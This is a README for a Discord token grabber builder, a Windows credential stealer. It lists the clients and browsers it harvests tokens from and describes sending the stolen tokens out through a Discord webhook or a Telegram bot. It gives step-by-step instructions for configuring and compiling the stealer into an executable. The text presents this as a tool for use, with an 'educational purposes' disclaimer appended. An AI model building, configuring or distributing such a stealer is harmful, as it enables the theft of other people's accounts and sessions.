# A Discord Token Grabber Builder
* The original version of the grabber is supported by python 3.6+
* The builder was tested in python 3.8.6, i do not give any guarantees that it will work on other python versions.
* **Grabber only for Windows.</b></p>**
***
# Features
* No local caching

* Grabber supports multiple directories
    - [x] Discord, Discord Canarry, Discord PTB
    - [x] Google Chrome, Opera, Brave, Yandex
    - [ ] Firefox

* Allows you to send tokens in discord / telegram
***
# Preview Builder

![](https://media.discordapp.net/attachments/797823091899236433/799286909092233238/unknown.png?width=1060&height=613)
***

# Build Stealer With Builder:
```console
python -m pip install -r requirements.txt
```
##### Run Builder
```console
python builder.py
```
* Then you can find the .exe version of the file in the folder `build`

***
# Build Stealer Without Builder
#### Discord
1. Create a webhook on your Discord server.
2. Change the `WEBHOOK_URL` variable value to your Discord webhook URL in [token-grabber.py](token-grabber.py)
3. Change as desired `WEBHOOK_STYLE` to `True`(Slower) or `False`

#### Telegram
1. Receive a bot token through [Bot Father](https://t.me/botfather)
2. Send to the newly created bot `/start`
3. Get your telegram id with [Get my id bot](https://t.me/getmyid_bot)
4. Paste token to `TELEGRAM_BOT_TOKEN` and your telegram id to `TELEGRAM_USER_ID` in [token-grabber.py](token-grabber.py)
5. Change as desired `TELEGRAM_STYLE` to `True`(Slower) or `False`
##### Done, now you can compile `token-grabber.py` to `.exe` with [pyinstaller](https://pypi.org/project/pyinstaller/)

# Preview grabber info:
### Discord Webhook:
<p align="center">WEBHOOK_STYLE : 1(Slower)</p>
<р align="center"><img align="center" src="https://media.discordapp.net/attachments/769178644697972767/798917458840518696/unknown.png?width=341&height=567"></p>

<p align="center">WEBHOOK_STYLE : 2</p>
<р align="center"><img align="center" src="https://media.discordapp.net/attachments/769178644697972767/798918343061929994/unknown.png"></p>
---------------------------------------------------------------------------------------------------------
### Telegram Message:
<p align="center">TELEGRAM_STYLE : 1(Slower)</p>
<р align="center"><img align="center" src="https://media.discordapp.net/attachments/769178644697972767/798919478548103168/unknown.png"></p>

<p align="center">TELEGRAM_STYLE : 2</p>
<р align="center"><img align="center" src="https://media.discordapp.net/attachments/769178644697972767/798921203824984093/unknown.png"></p>
---------------------------------------------------------------------------------------------------------
***

## Author
- **wodx**
    - [Github](https://github.com/wodxgod)
    - [PayPal.me](https://www.paypal.com/paypalme2/wodx)

## Donate
You can donate to author PayPal at https://www.paypal.com/paypalme2/wodx <3
***
# Legality
Everything you can see here has been made for educational purposes and proof of concepts. I do not promote the usage of my tools, I do not take responsability on the bad usage of this tool.
